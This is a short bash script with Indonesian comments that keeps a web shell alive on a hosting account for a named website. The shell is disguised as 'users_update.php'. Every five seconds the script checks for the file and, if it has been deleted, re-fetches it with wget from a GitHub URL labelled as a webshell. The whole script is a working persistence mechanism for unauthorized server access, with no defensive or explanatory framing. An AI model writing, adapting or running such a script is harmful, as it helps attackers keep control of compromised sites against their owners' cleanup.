#!/bin/bash

# Konfigurasi
URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/user_upgrade.php"
DOWNLOAD_DIR="/home/u757785818/domains/jcsjo.com/public_html/"
OUTPUT_FILE="users_update.php"
OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"

# Pastikan direktori tujuan ada
mkdir -p "$DOWNLOAD_DIR"

echo "Monitoring file: $OUTPUT_PATH"

# Loop tanpa batas untuk memantau file
while true; do
    if [[ ! -f "$OUTPUT_PATH" ]]; then
        echo "[$(date)] File tidak ditemukan, mengunduh ulang..."
        wget -q "$URL" -O "$OUTPUT_PATH"

        # Validasi apakah file berhasil diunduh
        if [[ -s "$OUTPUT_PATH" ]]; then
            echo "[$(date)] File berhasil diunduh: $OUTPUT_PATH"
        else
            echo "[$(date)] Gagal mengunduh atau file kosong, mencoba lagi..."
            rm -f "$OUTPUT_PATH"
        fi
    fi

    sleep 5  # Periksa setiap 5 detik
done
